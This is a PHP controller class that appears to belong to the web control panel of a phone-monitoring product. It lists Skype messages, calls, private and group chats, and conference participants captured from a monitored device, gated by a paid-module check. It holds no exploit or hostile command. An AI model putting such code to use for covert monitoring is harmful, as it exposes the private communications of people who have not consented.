<?php

namespace Controllers;

use Models\Modules;
use CS\Devices\Limitations;
use System\FlashMessages;

class Skype extends BaseModuleController
{

    protected $module = Modules::SKYPE;

    protected function init()
    {
        parent::init();

        $this->initCP();
    }

    public function indexAction()
    {
        $skypeModel = new \Models\Cp\Skype($this->di);

        if ($this->getRequest()->isAjax()) {
            $dataTableRequest = new \System\DataTableRequest($this->di);

            switch ($this->params['tab']) {
                case 'messages':
                    $data = $skypeModel->getMessagesDataTableData(
                            $this->di['devId'], $dataTableRequest->buildResult(array('account', 'timeFrom', 'timeTo'))
                    );
                    break;
                case 'calls':
                    $data = $skypeModel->getCallsDataTableData(
                            $this->di['devId'], $dataTableRequest->buildResult(array('account', 'timeFrom', 'timeTo'))
                    );
                    break;
            }
            $this->checkDisplayLength($dataTableRequest->getDisplayLength());
            $this->makeJSONResponse($data);
        }


        if ($this->view->paid) {
            $this->view->accounts = $skypeModel->getAccountsList($this->di['devId']);
            $this->view->hasRecords = count($this->view->accounts);
        }

        $this->setView('cp/skype.htm');
    }

    public function listAction()
    {
        $skypeModel = new \Models\Cp\Skype($this->di);

        if ($this->getRequest()->isAjax()) {

            $currPage = ($this->getRequest()->hasPost('currPage') && $this->getRequest()->post('currPage') > 0) ? $this->getRequest()->post('currPage') : 0;
            $perPage = ($this->getRequest()->hasPost('perPage') && $this->getRequest()->post('perPage') > 0) ? $this->getRequest()->post('perPage') : $this->lengthPage;
            $search = ($this->getRequest()->hasPost('search')) ? $this->getRequest()->post('search') : false;

            $data = array();
            if ($this->params['tab'] == 'private')
                $data = $skypeModel->getItemsPrivateList($this->di['devId'], $this->params['account'], $this->params['id'], $search, $currPage, $perPage);

            if ($this->params['tab'] == 'group')
                $data = $skypeModel->getItemsGroupList($this->di['devId'], $this->params['account'], $this->params['id'], $search, $currPage, $perPage);

            $this->makeJSONResponse($data);
        }

        $dialogueExists = false;

        switch ($this->params['tab']) {
            case 'group':
                $dialogueExists = $skypeModel->isGroupDialogueExists($this->di['devId'], $this->params['account'], $this->params['id']);
                $this->view->users = $skypeModel->getGroupUsers($this->di['devId'], $this->params['account'], $this->params['id']);
                break;

            case 'private':
                $accountName = $skypeModel->getAccountName($this->di['devId'], $this->params['account'], $this->params['id']);
                if ($accountName !== false) {
                    $this->view->accountName = $accountName;
                    $dialogueExists = true;
                }
                break;

            default:
                $this->redirect($this->di['router']->getRouteUrl('skype'));
                break;
        }

        if (!$dialogueExists) {
            $this->di['flashMessages']->add(FlashMessages::ERROR, $this->di['t']->_('The dialogue has not been found!'));
            $this->redirect($this->di['router']->getRouteUrl('skype'));
        }

        $this->view->tab = $this->params['tab'];
        $this->view->id = $this->params['id'];
        $this->view->account = $this->params['account'];

        $this->setView('cp/skypeList.htm');
    }

    public function conferenceAction()
    {
        $skypeModel = new \Models\Cp\Skype($this->di);

        $this->view->users = $skypeModel->getConferenceUsers($this->di['devId'], $this->params['account'], $this->params['id']);

        if (!count($this->view->users)) {
            $this->error404();
        }

        $this->setView('cp/skypeConference.htm');
    }

    protected function postAction()
    {
        parent::postAction();
        $this->buildCpMenu();

        $this->view->title = $this->di['t']->_('Skype');

        if ($this->di['currentDevice']['os'] != 'icloud') {
            $this->view->customTimezoneOffset = 0;
        }

        $this->view->moduleId = Modules::SKYPE;
    }

    protected function isModulePaid()
    {
        $devicesLimitations = new Limitations($this->di['db']);
        return $devicesLimitations->isAllowed($this->di['devId'], Limitations::SKYPE);
    }

}
